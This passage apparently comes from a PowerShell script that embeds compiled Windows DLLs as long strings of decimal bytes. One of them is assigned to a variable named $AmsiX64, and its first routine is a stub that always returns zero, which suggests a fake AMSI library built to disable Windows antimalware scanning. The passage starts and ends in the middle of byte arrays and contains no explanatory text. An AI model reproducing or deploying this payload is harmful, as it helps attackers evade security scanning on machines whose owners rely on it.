0 0 0 0 0 0 164 38 0 0 72 32 0 0 228 36 0 0 0 0 0 0 0 0 0 0 206 39 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 198 38 0 0 0 39 0 0 20 39 0 0 40 39 0 0 68 39 0 0 186 39 0 0 164 39 0 0 138 39 0 0 116 39 0 0 94 39 0 0 226 38 0 0 0 0 0 0 184 37 0 0 84 37 0 0 152 37 0 0 118 37 0 0 194 37 0 0 0 0 0 0 154 38 0 0 140 38 0 0 116 38 0 0 88 38 0 0 60 38 0 0 26 38 0 0 8 38 0 0 250 37 0 0 238 37 0 0 0 0 0 0 40 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 105 110 118 111 107 101 95 116 114 105 103 103 101 114 0 41 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 114 101 116 117 114 110 95 116 114 105 103 103 101 114 0 37 0 95 95 115 116 100 95 116 121 112 101 95 105 110 102 111 95 100 101 115 116 114 111 121 95 108 105 115 116 0 0 72 0 109 101 109 115 101 116 0 0 53 0 95 101 120 99 101 112 116 95 104 97 110 100 108 101 114 52 95 99 111 109 109 111 110 0 86 67 82 85 78 84 73 77 69 49 52 48 46 100 108 108 0 0 56 0 95 105 110 105 116 116 101 114 109 0 57 0 95 105 110 105 116 116 101 114 109 95 101 0 65 0 95 115 101 104 95 102 105 108 116 101 114 95 100 108 108 0 53 0 95 105 110 105 116 105 97 108 105 122 101 95 110 97 114 114 111 119 95 101 110 118 105 114 111 110 109 101 110 116 0 0 54 0 95 105 110 105 116 105 97 108 105 122 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 0 62 0 95 114 101 103 105 115 116 101 114 95 111 110 101 120 105 116 95 102 117 110 99 116 105 111 110 0 36 0 95 101 120 101 99 117 116 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 31 0 95 99 114 116 95 97 116 101 120 105 116 0 23 0 95 99 101 120 105 116 0 0 97 112 105 45 109 115 45 119 105 110 45 99 114 116 45 114 117 110 116 105 109 101 45 108 49 45 49 45 48 46 100 108 108 0 130 5 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 0 67 5 83 101 116 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 9 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 0 97 5 84 101 114 109 105 110 97 116 101 80 114 111 99 101 115 115 0 0 109 3 73 115 80 114 111 99 101 115 115 111 114 70 101 97 116 117 114 101 80 114 101 115 101 110 116 0 45 4 81 117 101 114 121 80 101 114 102 111 114 109 97 110 99 101 67 111 117 110 116 101 114 0 10 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 73 100 0 14 2 71 101 116 67 117 114 114 101 110 116 84 104 114 101 97 100 73 100 0 0 214 2 71 101 116 83 121 115 116 101 109 84 105 109 101 65 115 70 105 108 101 84 105 109 101 0 75 3 73 110 105 116 105 97 108 105 122 101 83 76 105 115 116 72 101 97 100 0 103 3 73 115 68 101 98 117 103 103 101 114 80 114 101 115 101 110 116 0 75 69 82 78 69 76 51 50 46 100 108 108 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 177 25 191 68 78 230 64 187 255 255 255 255 0 0 0 0 1 0 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 54 0 0 0 73 0 0 0 76 0 0 0 12 0 0 0 10 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 24 0 0 0 24 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 2 0 0 0 48 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 9 4 0 0 72 0 0 0 96 80 0 0 125 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 60 63 120 109 108 32 118 101 114 115 105 111 110 61 39 49 46 48 39 32 101 110 99 111 100 105 110 103 61 39 85 84 70 45 56 39 32 115 116 97 110 100 97 108 111 110 101 61 39 121 101 115 39 63 62 13 10 60 97 115 115 101 109 98 108 121 32 120 109 108 110 115 61 39 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 49 39 32 109 97 110 105 102 101 115 116 86 101 114 115 105 111 110 61 39 49 46 48 39 62 13 10 32 32 60 116 114 117 115 116 73 110 102 111 32 120 109 108 110 115 61 34 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 51 34 62 13 10 32 32 32 32 60 115 101 99 117 114 105 116 121 62 13 10 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 69 120 101 99 117 116 105 111 110 76 101 118 101 108 32 108 101 118 101 108 61 39 97 115 73 110 118 111 107 101 114 39 32 117 105 65 99 99 101 115 115 61 39 102 97 108 115 101 39 32 47 62 13 10 32 32 32 32 32 32 60 47 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 60 47 115 101 99 117 114 105 116 121 62 13 10 32 32 60 47 116 114 117 115 116 73 110 102 111 62 13 10 60 47 97 115 115 101 109 98 108 121 62 13 10 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 16 0 0 12 1 0 0 7 48 108 48 155 48 171 48 194 48 211 48 228 48 233 48 2 49 7 49 20 49 97 49 126 49 136 49 150 49 168 49 189 49 251 49 212 50 7 51 85 51 94 51 105 51 112 51 144 51 150 51 156 51 162 51 168 51 174 51 181 51 188 51 195 51 202 51 209 51 216 51 223 51 231 51 239 51 247 51 3 52 12 52 17 52 23 52 33 52 43 52 59 52 75 52 91 52 100 52 201 52 121 53 170 53 249 53 12 54 31 54 43 54 59 54 76 54 114 54 135 54 142 54 148 54 166 54 176 54 17 55 30 55 69 55 77 55 102 55 160 55 187 55 199 55 214 55 223 55 236 55 27 56 35 56 46 56 52 56 58 56 70 56 76 56 111 56 160 56 75 57 106 57 116 57 133 57 146 57 151 57 189 57 194 57 231 57 241 57 14 58 91 58 96 58 115 58 129 58 156 58 167 58 54 59 63 59 71 59 142 59 157 59 164 59 218 59 227 59 240 59 251 59 4 60 19 60 30 60 36 60 42 60 48 60 54 60 60 60 66 60 72 60 78 60 84 60 90 60 96 60 102 60 108 60 114 60 0 0 0 32 0 0 32 0 0 0 112 48 164 48 168 48 92 49 96 49 104 49 48 52 80 52 108 52 112 52 140 52 144 52 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0"
    $AmsiX64 = "77 90 144 0 3 0 0 0 4 0 0 0 255 255 0 0 184 0 0 0 0 0 0 0 64 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 14 31 186 14 0 180 9 205 33 184 1 76 205 33 84 104 105 115 32 112 114 111 103 114 97 109 32 99 97 110 110 111 116 32 98 101 32 114 117 110 32 105 110 32 68 79 83 32 109 111 100 101 46 13 13 10 36 0 0 0 0 0 0 0 148 172 98 253 208 205 12 174 208 205 12 174 208 205 12 174 217 181 159 174 210 205 12 174 190 150 13 175 211 205 12 174 190 150 15 175 210 205 12 174 190 150 9 175 216 205 12 174 190 150 8 175 217 205 12 174 13 50 199 174 210 205 12 174 208 205 13 174 240 205 12 174 2 150 4 175 209 205 12 174 2 150 243 174 209 205 12 174 2 150 14 175 209 205 12 174 82 105 99 104 208 205 12 174 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 80 69 0 0 100 134 7 0 136 29 62 87 0 0 0 0 0 0 0 0 240 0 34 32 11 2 14 0 0 16 0 0 0 28 0 0 0 0 0 0 160 19 0 0 0 16 0 0 0 0 0 128 1 0 0 0 0 16 0 0 0 2 0 0 6 0 0 0 0 0 0 0 6 0 0 0 0 0 0 0 0 128 0 0 0 4 0 0 0 0 0 0 2 0 96 1 0 0 16 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 16 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 0 0 0 108 38 0 0 80 0 0 0 0 96 0 0 224 1 0 0 0 64 0 0 176 1 0 0 0 0 0 0 0 0 0 0 0 112 0 0 24 0 0 0 112 33 0 0 112 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 224 33 0 0 148 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 248 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 46 116 101 120 116 0 0 0 211 14 0 0 0 16 0 0 0 16 0 0 0 4 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 96 46 114 100 97 116 97 0 0 128 10 0 0 0 32 0 0 0 12 0 0 0 20 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 100 97 116 97 0 0 0 64 6 0 0 0 48 0 0 0 2 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 192 46 112 100 97 116 97 0 0 176 1 0 0 0 64 0 0 0 2 0 0 0 34 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 103 102 105 100 115 0 0 16 0 0 0 0 80 0 0 0 2 0 0 0 36 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 115 114 99 0 0 0 224 1 0 0 0 96 0 0 0 2 0 0 0 38 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 101 108 111 99 0 0 24 0 0 0 0 112 0 0 0 2 0 0 0 40 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 66 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 51 192 195 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 102 102 15 31 132 0 0 0 0 0 72 59 13 217 31 0 0 242 117 18 72 193 193 16 102 247 193 255 255 242 117 2 242 195 72 193 201 16 233 211 3 0 0 204 204 204 72 131 236 40 133 210 116 57 131 234 1 116 40 131 234 1 116 22 131 250 1 116 10 184 1 0 0 0 72 131 196 40 195 232 142 5 0 0 235 5 232 95 5 0 0 15 182 192 72 131 196 40 195 73 139 208 72 131 196 40 233 15 0 0 0 77 133 192 15 149 193 72 131 196 40 233 44 1 0 0 72 137 92 36 8 72 137 116 36 16 72 137 124 36 32 65 86 72 131 236 32 72 139 242 76 139 241 51 201 232 2 6 0 0 132 192 117 7 51 192 233 232 0 0 0 232 150 4 0 0 138 216 136 68 36 64 64 183 1 131 61 234 36 0 0 0 116 10 185 7 0 0 0 232 62 9 0 0 199 5 212 36 0 0 1 0 0 0 232 199 4 0 0 132 192 116 103 232 110 10 0 0 72 141 13 179 10 0 0 232 6 8 0 0 232 197 8 0 0 72 141 13 206 8 0 0 232 245 7 0 0 232 224 8 0 0 72 141 21 253 15 0 0 72 141 13 238 15 0 0 232 213 12 0 0 133 192 117 41 232 96 4 0 0 132 192 116 32 72 141 21 205 15 0 0 72 141 13 190 15 0 0 232 175 12 0 0 199 5 103 36 0 0 2 0 0 0 64 50 255 138 203 232 9 7 0 0 64 132 255 15 133 78 255 255 255 232 167 8 0 0 72 139 216 72 131 56 0 116 36 72 139 200 232 78 6 0 0 132 192 116 24 72 139 27 72 139 203 232 111 10 0 0 76 139 198 186 2 0 0 0 73 139 206 255 211 255 5 156 30 0 0 184 1 0 0 0 72 139 92 36 48 72 139 116 36 56 72 139 124 36 72 72 131 196 32 65 94 195 204 72 137 92 36 8 72 137 116 36 24 87 72 131 236 32 64 138 241 139 5 104 30 0 0 51 219 133 192 127 4 51 192 235 80 255 200 137 5 86 30 0 0 232 109 3 0 0 64 138 248 136 68 36 56 131 61 195 35 0 0 2 116 10 185 7 0 0 0 232 23 8 0 0 232 102 4 0 0 137 29 172 35 0 0 232 139 4 0 0 64 138 207 232 75 6 0 0 51 210 64 138 206 232 101 6 0 0 132 192 15 149 195 139 195 72 139 92 36 48 72 139 116 36 64 72 131 196 32 95 195 204 204 72 139 196 72 137 88 32 76 137 64 24 137 80 16 72 137 72 8 86 87 65 86 72 131 236 64 77 139 240 139 250 72 139 241 141 66 255 131 248 1 119 46 232 217 0 0 0 139 216 137 68 36 48 133 192 15 132 179 0 0 0 77 139 198 139 215 72 139 206 232 182 253 255 255 139 216 137 68 36 48 133 192 15 132 152 0 0 0 131 255 1 117 8 72 139 206 232 55 11 0 0 77 139 198 139 215 72 139 206 232 74 253 255 255 139 216 137 68 36 48 131 255 1 117 52 133 192 117 39 77 139 198 51 210 72 139 206 232 46 253 255 255 77 139 198 51 210 72 139 206 232 101 253 255 255 77 139 198 51 210 72 139 206 232 96 0 0 0 131 255 1 117 4 133 219 116 4 133 255 117 12 72 139 206 232 229 10 0 0 133 255 116 5 131 255 3 117 42 77 139 198 139 215 72 139 206 232 45 253 255 255 139 216 137 68 36 48 133 192 116 19 77 139 198 139 215 72 139 206 232 30 0 0 0 139 216 137 68 36 48 235 6 51 219 137 92 36 48 139 195 72 139 92 36 120 72 131 196 64 65 94 95 94 195 72 137 92 36 8 72 137 108 36 16 72 137 116 36 24 87 72 131 236 32 72 139 29 233 13 0 0 73 139 248 139 242 72 139 233 72 133 219 117 5 141 67 1 235 18 72 139 203 232 127 8 0 0 76 139 199 139 214 72 139 205 255 211 72 139 92 36 48 72 139 108 36 56 72 139 116 36 64 72 131 196 32 95 195 72 137 92 36 8 72 137 116 36 16 87 72 131 236 32 73 139 248 139 218 72 139 241 131 250 1 117 5 232 99 5 0 0 76 139 199 139 211 72 139 206 72 139 92 36 48 72 139 116 36 56 72 131 196 32 95 233 103 254 255 255 204 204 204 64 83 72 131 236 32 72 139 217 51 201 255 21 119 12 0 0 72 139 203 255 21 6 12 0 0 255 21 32 12 0 0 72 139 200 186 9 4 0 192 72 131 196 32 91 72 255 37 76 12 0 0 72 137 76 36 8 72 131 236 56 185 23 0 0 0 232 13 10 0 0 133 192 116 7 185 2 0 0 0 205 41 72 141 13 183 28 0 0 232 170 0 0 0 72 139 68 36 56 72 137 5 158 29 0 0 72 141 68 36 56 72 131 192 8 72 137 5 46 29 0 0 72 139 5 135 29 0 0 72 137 5 248 27 0 0 72 139 68 36 64 72 137 5 252 28 0 0 199 5 210 27 0 0 9 4 0 192 199 5 204 27 0 0 1 0 0 0 199 5 214 27 0 0 1 0 0 0 184 8 0 0 0 72 107 192 0 72 141 13 206 27 0 0 72 199 4 1 2 0 0 0 184 8 0 0 0 72 107 192 0 72 139 13 70 27 0 0 72 137 76 4 32 184 8 0 0 0 72 107 192 1 72 139 13 57 27 0 0 72 137 76 4 32 72 141 13 125 12 0 0 232 0 255 255 255 72 131 196 56 195 204 204 204 64 83 86 87 72 131 236 64 72 139 217 255 21 31 11 0 0 72 139 179 248 0 0 0 51 255 69 51 192 72 141 84 36 96 72 139 206 255 21 253 10 0 0 72 133 192 116 57 72 131 100 36 56 0 72 141 76 36 104 72 139 84 36 96 76 139 200 72 137 76 36 48 76 139 198 72 141 76 36 112 72 137 76 36 40 51 201 72 137 92 36 32 255 21 190 10 0 0 255 199 131 255 2 124 177 72 131 196 64 95 94 91 195 204 204 204 72 131 236 40 232 103 8 0 0 133 192 116 33 101 72 139 4 37 48 0 0 0 72 139 72 8 235 5 72 59 200 116 20 51 192 240 72 15 177 13 64 32 0 0 117 238 50 192 72 131 196 40 195 176 1 235 247 204 204 204 72 131 236 40 232 43 8 0 0 133 192 116 7 232 94 6 0 0 235 5 232 95 8 0 0 176 1 72 131 196 40 195 72 131 236 40 51 201 232 65 1 0 0 132 192 15 149 192 72 131 196 40 195 204 204 204 72 131 236 40 232 99 8 0 0 132 192 117 4 50 192 235 18 232 86 8 0 0 132 192 117 7 232 77 8 0 0 235 236 176 1 72 131 196 40 195 72 131 236 40 232 59 8 0 0 232 54 8 0 0 176 1 72 131 196 40 195 204 204 204 72 137 92 36 8 72 137 108 36 16 72 137 116 36 24 87 72 131 236 32 73 139 249 73 139 240 139 218 72 139 233 232 152 7 0 0 133 192 117 23 131 251 1 117 18 72 139 207 232 187 5 0 0 76 139 198 51 210 72 139 205 255 215 72 139 84 36 88 139 76 36 80 72 139 92 36 48 72 139 108 36 56 72 139 116 36 64 72 131 196 32 95 233 153 7 0 0 204 204 204 72 131 236 40 232 79 7 0 0 133 192 116 16 72 141 13 72 31 0 0 72 131 196 40 233 145 7 0 0 232 106 249 255 255 133 192 117 5 232 143 7 0 0 72 131 196 40 195 72 131 236 40 51 201 232 141 7 0 0 72 131 196 40 233 132 7 0 0 64 83 72 131 236 32 15 182 5 59 31 0 0 133 201 187 1 0 0 0 15 68 195 136 5 43 31 0 0 232 46 5 0 0 232 93 7 0 0 132 192 117 4 50 192 235 20 232 80 7 0 0 132 192 117 9 51 201 232 69 7 0 0 235 234 138 195 72 131 196 32 91 195 204 204 204 72 137 92 36 8 85 72 139 236 72 131 236 64 139 217 131 249 1 15 135 166 0 0 0 232 171 6 0 0 133 192 116 43 133 219 117 39 72 141 13 160 30 0 0 232 225 6 0 0 133 192 116 4 50 192 235 122 72 141 13 164 30 0 0 232 205 6 0 0 133 192 15 148 192 235 103 72 139 21 169 24 0 0 73 131 200 255 139 194 185 64 0 0 0 131 224 63 43 200 176 1 73 211 200 76 51 194 76 137 69 224 76 137 69 232 15 16 69 224 76 137 69 240 242 15 16 77 240 15 17 5 69 30 0 0 76 137 69 224 76 137 69 232 15 16 69 224 76 137 69 240 242 15 17 13 61 30 0 0 242 15 16 77 240 15 17 5 57 30 0 0 242 15 17 13 65 30 0 0 72 139 92 36 80 72 131 196 64 93 195 185 5 0 0 0 232 84 2 0 0 204 204 204 204 72 131 236 24 76 139 193 184 77 90 0 0 102 57 5 29 232 255 255 117 124 72 99 5 80 232 255 255 72 141 21 13 232 255 255 72 141 12 16 129 57 80 69 0 0 117 98 184 11 2 0 0 102 57 65 24 117 87 76 43 194 15 183 65 20 72 141 81 24 72 3 208 15 183 65 6 72 141 12 128 76 141 12 202 72 137 20 36 73 59 209 116 24 139 74 12 76 59 193 114 10 139 66 8 3 193 76 59 192 114 8 72 131 194 40 235 223 51 210 72 133 210 117 4 50 192 235 23 247 66 36 0 0 0 128 116 4 50 192 235 10 176 1 235 6 50 192 235 2 50 192 72 131 196 24 195 64 83 72 131 236 32 138 217 232 83 5 0 0 51 210 133 192 116 11 132 219 117 7 72 135 21 62 29 0 0 72 131 196 32 91 195 64 83 72 131 236 32 128 61 99 29 0 0 0 138 217 116 4 132 210 117 14 138 203 232 144 5 0 0 138 203 232 137 5 0 0 176 1 72 131 196 32 91 195 204 64 83 72 131 236 32 72 139 21 55 23 0 0 72 139 217 139 202 72 51 21 251 28 0 0 131 225 63 72 211 202 72 131 250 255 117 10 72 139 203 232 63 5 0 0 235 15 72 139 211 72 141 13 219 28 0 0 232 34 5 0 0 51 201 133 192 72 15 68 203 72 139 193 72 131 196 32 91 195 204 72 131 236 40 232 167 255 255 255 72 247 216 27 192 247 216 255 200 72 131 196 40 195 204 72 137 92 36 32 85 72 139 236 72 131 236 32 72 131 101 24 0 72 187 50 162 223 45 153 43 0 0 72 139 5 185 22 0 0 72 59 195 117 111 72 141 77 24 255 21 226 6 0 0 72 139 69 24 72 137 69 16 255 21 220 6 0 0 139 192 72 49 69 16 255 21 216 6 0 0 139 192 72 141 77 32 72 49 69 16 255 21 208 6 0 0 139 69 32 72 141 77 16 72 193 224 32 72 51 69 32 72 51 69 16 72 51 193 72 185 255 255 255 255 255 255 0 0 72 35 193 72 185 51 162 223 45 153 43 0 0 72 59 195 72 15 68 193 72 137 5 69 22 0 0 72 139 92 36 72 72 247 208 72 137 5 62 22 0 0 72 131 196 32 93 195 72 141 13 57 28 0 0 72 255 37 82 6 0 0 204 204 72 141 13 41 28 0 0 233 6 4 0 0 72 141 5 45 28 0 0 195 72 141 5 45 28 0 0 195 72 131 236 40 232 231 255 255 255 72 131 8 4 232 230 255 255 255 72 131 8 2 72 131 196 40 195 204 72 141 5 25 28 0 0 195 72 137 92 36 8 85 72 141 172 36 64 251 255 255 72 129 236 192 5 0 0 139 217 185 23 0 0 0 232 243 3 0 0 133 192 116 4 139 203 205 41 131 37 224 27 0 0 0 72 141 77 240 51 210 65 184 208 4 0 0 232 151 3 0 0 72 141 77 240 255 21 173 5 0 0 72 139 157 232 0 0 0 72 141 149 216 4 0 0 72 139 203 69 51 192 255 21 139 5 0 0 72 133 192 116 60 72 131 100 36 56 0 72 141 141 224 4 0 0 72 139 149 216 4 0 0 76 139 200 72 137 76 36 48 76 139 195 72 141 141 232 4 0 0 72 137 76 36 40 72 141 77 240 72 137 76 36 32 51 201 255 21 66 5 0 0 72 139 133 200 4 0 0 72 141 76 36 80 72 137 133 232 0 0 0 51 210 72 141 133 200 4 0 0 65 184 152 0 0 0 72 131 192 8 72 137 133 136 0 0 0 232 0 3 0 0 72 139 133 200 4 0 0 72 137 68 36 96 199 68 36 80 21 0 0 64 199 68 36 84 1 0 0 0 255 21 14 5 0 0 131 248 1 72 141 68 36 80 72 137 68 36 64 72 141 69 240 15 148 195 72 137 68 36 72 51 201 255 21 45 5 0 0 72 141 76 36 64 255 21 186 4 0 0 133 192 117 10 246 219 27 192 33 5 220 26 0 0 72 139 156 36 208 5 0 0 72 129 196 192 5 0 0 93 195 204 204 204 72 137 92 36 8 72 137 116 36 16 87 72 131 236 32 72 141 29 154 9 0 0 72 141 53 147 9 0 0 235 22 72 139 59 72 133 255 116 10 72 139 207 232 105 0 0 0 255 215 72 131 195 8 72 59 222 114 229 72 139 92 36 48 72 139 116 36 56 72 131 196 32 95 195 204 204 72 137 92 36 8 72 137 116 36 16 87 72 131 236 32 72 141 29 94 9 0 0 72 141 53 87 9 0 0 235 22 72 139 59 72 133 255 116 10 72 139 207 232 29 0 0 0 255 215 72 131 195 8 72 59 222 114 229 72 139 92 36 48 72 139 116 36 56 72 131 196 32 95 195 204 204 72 255 37 241 4 0 0 204 72 137 92 36 16 85 72 139 236 72 131 236 32 131 101 232 0 51 201 51 192 199 5 245 19 0 0 2 0 0 0 15 162 68 139 193 199 5 226 19 0 0 1 0 0 0 65 129 240 110 116 101 108 68 139 202 65 129 241 105 110 101 73 68 139 210 69 11 200 139 211 129 242 71 101 110 117 68 139 216 68 11 202 184 1 0 0 0 65 15 148 192 129 241 99 65 77 68 129 243 65 117 116 104 65 129 242 101 110 116 105 65 11 218 11 217 65 15 148 194 51 201 15 162 68 139 201 137 69 240 69 132 192 68 137 77 248 68 139 5 156 25 0 0 139 200 137 93 244 137 85 252 116 82 72 131 13 118 19 0 0 255 65 131 200 4 37 240 63 255 15 68 137 5 122 25 0 0 61 192 6 1 0 116 40 61 96 6 2 0 116 33 61 112 6 2 0 116 26 5 176 249 252 255 131 248 32 119 27 72 187 1 0 1 0 1 0 0 0 72 15 163 195 115 11 65 131 200 1 68 137 5 64 25 0 0 69 132 210 116 25 129 225 0 15 240 15 129 249 0 15 96 0 124 11 65 131 200 4 68 137 5 34 25 0 0 184 7 0 0 0 137 85 224 68 137 77 228 68 59 216 124 36 51 201 15 162 137 69 240 137 93 244 137 77 248 137 85 252 137 93 232 15 186 227 9 115 11 65 131 200 2 68 137 5 237 24 0 0 65 15 186 225 20 115 110 199 5 192 18 0 0 2 0 0 0 199 5 186 18 0 0 6 0 0 0 65 15 186 225 27 115 83 65 15 186 225 28 115 76 51 201 15 1 208 72 193 226 32 72 11 208 72 137 85 16 72 139 69 16 36 6 60 6 117 50 139 5 140 18 0 0 131 200 8 199 5 123 18 0 0 3 0 0 0 246 69 232 32 137 5 117 18 0 0 116 19 131 200 32 199 5 98 18 0 0 5 0 0 0 137 5 96 18 0 0 51 192 72 139 92 36 56 72 131 196 32 93 195 204 204 204 51 192 57 5 92 18 0 0 15 149 192 195 194 0 0 204 204 204 204 204 255 37 178 2 0 0 255 37 164 2 0 0 255 37 150 2 0 0 255 37 